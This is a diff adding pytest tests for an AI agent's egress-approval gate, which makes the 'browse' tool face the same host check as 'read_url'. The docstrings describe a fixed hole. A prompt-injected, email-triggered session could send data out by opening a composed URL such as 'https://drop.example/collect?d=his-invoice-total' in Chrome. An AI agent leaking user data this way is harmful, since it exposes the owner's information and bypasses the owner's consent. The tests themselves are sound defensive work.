@@ -11838,6 +11838,148 @@ class TestTheEgressVouchOutlivesTheAgent:
         assert inner._approved_hosts == {"allegro.pl"}
 
 
+class TestOneAnswerPerReadWhicheverTool:
+    """#341. `EGRESS_TOOLS` held `read_url` and not `browse`, so the identical
+    page was carded through one tool and free through the other — the model's
+    choice of tool deciding the permission, which is the exact bypassability
+    #287 fixed one layer down, surviving one layer up.
+
+    The unattended half was a live hole, not a tidiness point: the browse
+    dispatch branch asked `_mail_link_gate` and `_browse_gate`, and
+    `_browse_gate` has no origin arm at all (`if not host or reading: return
+    None`). A triggered session could open `https://attacker/?d=<data>` in real
+    Chrome with only the mail-link rule in the way."""
+
+    PAYLOAD = "https://drop.example/collect?d=his-invoice-total"
+    PLAIN = "https://drop.example/article"
+
+    def _tainted(self, origin="user"):
+        agent, _ = make_agent([], origin=origin)
+        agent._tainted = True
+        return agent
+
+    def test_the_same_address_gets_the_same_verdict_through_either_tool(self):
+        """Asserted both directions, on the same agent, so no ordering or
+        per-tool state can make them agree by accident."""
+        agent = self._tainted()
+        assert agent._egress_novel_hosts("read_url", {"url": self.PAYLOAD}) == [
+            "drop.example"
+        ]
+        assert agent._egress_novel_hosts("browse", {"url": self.PAYLOAD}) == [
+            "drop.example"
+        ]
+
+    def test_a_plain_address_is_free_through_either_tool(self):
+        """Reading is free, and this must not become a card for browse where
+        read_url had none — the narrowing runs the same way round."""
+        agent = self._tainted()
+        assert agent._egress_novel_hosts("read_url", {"url": self.PLAIN}) is None
+        assert agent._egress_novel_hosts("browse", {"url": self.PLAIN}) is None
+
+    def test_one_vouch_covers_both_tools_in_both_directions(self):
+        """The card names a host, not a mechanism, so what it buys cannot
+        depend on which tool happened to draw it."""
+        for asked_through, then in (("read_url", "browse"), ("browse", "read_url")):
+            agent = self._tainted()
+            shown: list = []
+            agent.approve_tool = (
+                lambda n, a, p=None, seen=shown: seen.append(p) or True
+            )
+            assert agent._egress_gate(asked_through, {"url": self.PAYLOAD}) is None
+            assert len(shown) == 1
+            assert agent._egress_gate(then, {"url": self.PAYLOAD}) is None
+            assert len(shown) == 1  # the second tool asks nothing
+
+    def test_a_triggered_session_cannot_open_a_composed_address_in_chrome(self):
+        """The live hole. Unattended keeps the strict rule — every novel host,
+        payload or not — and it now reaches the browser too."""
+        agent = self._tainted(origin="email")
+        assert agent._egress_novel_hosts("browse", {"url": self.PAYLOAD}) == [
+            "drop.example"
+        ]
+        assert agent._egress_novel_hosts("browse", {"url": self.PLAIN}) == [
+            "drop.example"
+        ]
+
+    def test_only_the_OPEN_and_never_the_press(self):
+        """`browse_act`/`browse_fill` navigate from controls the PAGE wrote
+        rather than an address the model composed, and what may be typed into
+        them is the typing fence's question (#310). Widening this gate onto
+        them would put a card on pressing a link that is already carded, in
+        words about sending data that nothing checked."""
+        agent = self._tainted(origin="email")
+        assert agent._egress_novel_hosts("browse_act", {"target": "Dalej"}) is None
+        assert agent._egress_novel_hosts("browse_fill", {"steps": []}) is None
+
+    def test_naming_browse_in_the_tool_set_alone_would_not_have_worked(self):
+        """Pinned because it is invisible and it fails OPEN. The name branch
+        reads `url`; the else-branch reads `query`, which `browse` does not
+        have — so a `browse` that reached it would find no hosts in an empty
+        string and be freed. A future edit that drops `browse` from the name
+        tuple while leaving it in `EGRESS_TOOLS` puts the hole straight back."""
+        assert "browse" in agent_module.EGRESS_TOOLS
+        agent = self._tainted(origin="email")
+        assert agent._egress_novel_hosts("browse", {"query": ""}) == ["(no url)"]
+
+    def test_the_dispatch_branch_gates_before_chrome_is_reached(self, monkeypatch):
+        """At the gate is not the same as at the door. This drives the real
+        dispatch path: a denied open must leave `web.browse` uncalled."""
+        opened: list[str] = []
+        monkeypatch.setattr(
+            agent_module.web, "browse",
+            lambda url, topic=None, **_kw: (opened.append(url), "a page")[1],
+        )
+        asked: list = []
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[tool_call("read_url", url="https://blog.example/x")]),
+                model_says(tool_calls=[tool_call("browse", url=self.PAYLOAD)]),
+                model_says("stopped"),
+            ],
+            approve_tool=lambda n, a, p=None: asked.append(p) or False,
+        )
+        monkeypatch.setattr(
+            agent_module.web, "read_url",
+            lambda url, topic=None, **_kw: "a page",
+        )
+        agent.run_task("read the blog")
+        assert len(asked) == 1
+        assert opened == []
+
+    def test_an_approved_open_runs(self, monkeypatch):
+        """The other half of the same claim: the gate holds the call, it does
+        not remove the capability."""
+        opened: list[str] = []
+        monkeypatch.setattr(
+            agent_module.web, "browse",
+            lambda url, topic=None, **_kw: (opened.append(url), "a page")[1],
+        )
+        monkeypatch.setattr(
+            agent_module.web, "read_url", lambda url, topic=None, **_kw: "a page"
+        )
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[tool_call("read_url", url="https://blog.example/x")]),
+                model_says(tool_calls=[tool_call("browse", url=self.PAYLOAD)]),
+                model_says("done"),
+            ],
+            approve_tool=lambda n, a, p=None: True,
+        )
+        agent.run_task("read the blog")
+        assert opened == [self.PAYLOAD]
+
+    def test_the_card_never_says_which_tool_it_was(self):
+        """P1: mechanism words never appear on a consent surface. The owner is
+        told what changes for him, not which of aish's functions ran."""
+        agent = self._tainted()
+        shown: list = []
+        agent.approve_tool = lambda n, a, p=None: shown.append(p) or True
+        agent._egress_gate("browse", {"url": self.PAYLOAD})
+        assert shown and not any(
+            word in shown[0].lower() for word in ("browse", "drive", "read_url", "tool")
+        )
+
+
 class TestALinkThatArrivedByMail:
     """#279. Mail is the delivery mechanism for every account-recovery flow
     there is, so aish following a link by itself hands an injected turn the
